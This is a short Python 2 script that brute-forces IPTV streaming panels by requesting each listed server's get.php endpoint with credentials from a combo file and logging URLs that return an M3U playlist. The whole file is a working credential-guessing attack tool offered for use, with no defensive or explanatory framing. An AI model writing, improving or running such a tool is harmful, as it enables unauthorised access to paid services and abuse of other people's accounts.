try:
    from requests import get
    from urlparse import urlparse
    from duckduckgo import search
    from sys import argv
except ImportError as e:
    print str(e)

def bruteAccounts(urls, comboFile):
    for user in open(comboFile, 'r').readlines():
        print "[i] Trying combo: %s" % (user.strip())
        for url in open(urls, "r").readlines():
            try:
                accountToTry = "http://%s/get.php?username=%s&password=%s&type=m3u&output=ts" % (url.strip(), user.strip(), user.strip())
                if "#EXTINF:0" in get(accountToTry, timeout=15, stream=True).text:
                    print "[+] Playlist URL found: %s" % (accountToTry)
                    f = open("logs.txt", "a+")
                    f.write("%s\n" % (accountToTry))
                    f.close()
            except Exception as e:
                pass


if __name__ == '__main__':
    try:
        urls = argv[1]
        print "[+] Loaded %s URLs!" %(len(open(urls, "r").readlines()))
        comboFile = argv[2]
        bruteAccounts(urls, comboFile)
    except Exception as e:
        print "Error\n%s" % (str(e))
